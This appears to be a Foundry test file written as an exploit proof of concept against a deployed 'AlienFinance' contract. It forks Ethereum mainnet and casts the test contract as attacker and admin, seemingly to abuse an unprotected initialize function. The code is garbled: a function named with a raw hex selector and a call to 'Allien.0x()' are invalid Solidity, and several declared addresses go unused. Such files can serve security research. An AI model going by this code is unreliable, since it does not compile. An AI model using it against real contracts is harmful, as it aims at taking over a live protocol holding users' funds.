// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
interface IAlienFinance {
    function initialize() external;
    function 0x4b22a608() external;
}

contract InitializeAllienTest is Test {
    IAlienFinance private Allien = IAlienFinance(0x2c298e37bb283097b5f414e1e8F58F4c969558bE);
    address private attacker = address(this);
    address private gasStation = 0x456e92DfEd6F9ACb3D04caB7D934034B8380Be46;
    address private pointsOperator = 0xEF6f3dFE3f5964dF76ACd87b34e913577C462Cb0;
    address private admin = address(this);



    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth", 20771178);
        attacker = msg.sender;
    }

    function testExploit() public {
        Allien.0x();
        
    }

}
